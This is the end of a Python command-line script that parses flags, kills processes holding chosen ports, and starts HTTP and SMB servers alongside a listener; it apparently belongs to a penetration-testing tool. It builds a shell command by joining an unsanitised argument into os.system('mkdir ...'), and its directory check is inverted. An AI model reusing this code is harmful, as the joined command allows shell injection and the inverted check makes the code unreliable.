    parser.add_argument('-http',
                        action='store_true',
                        default=False,
                        help='Start http web server [Default: 8000]')
    parser.add_argument('-smb',
                        action='store_true',
                        default=False,
                        help='Start smb web server [Default: 445]')
    parser.add_argument('-k',
                        action='store_true',
                        default=False,
                        help='If port are being used it kill the process to force the exexcution.')
    args = parser.parse_args()

    port_to_check = []

    port_to_check.append(args.p)
    if (args.http):
        port_to_check.append(args.wp)
    if (args.smb):
        port_to_check.append(args.sp)

    port_used = check_port(port_to_check)
    if (len(port_used) and not args.k):
        print(Fore.YELLOW + "[*] " + Fore.RESET + "Use -k to kill all running process using the selected ports.")
        quit()
    else:
        kill(port_used)
    if (args.smb):
        if (os.path.isfile(args.f)):
            print(Fore.GREEN + "[+] " + Fore.RESET + f"{args.f} directory created Successfully!")
            os.system('mkdir ' + args.f)
        else:
            print(Fore.CYAN + "[*] " + Fore.RESET + f"./{args.f} directory already exists.")
    try:
        if (args.http):
            t1 = threading.Thread(target=webServer, args=(args.wp,), daemon = True)
            t1.start()
        if (args.smb):
            t2 = threading.Thread(target=smbserver, args=(args.f,args.sp,), daemon = True)
            t2.start()
        server(args.i,args.p,args.wp,args.http,args.smb,args.f)
    except KeyboardInterrupt:
        quit()

if __name__ == "__main__":
    main()
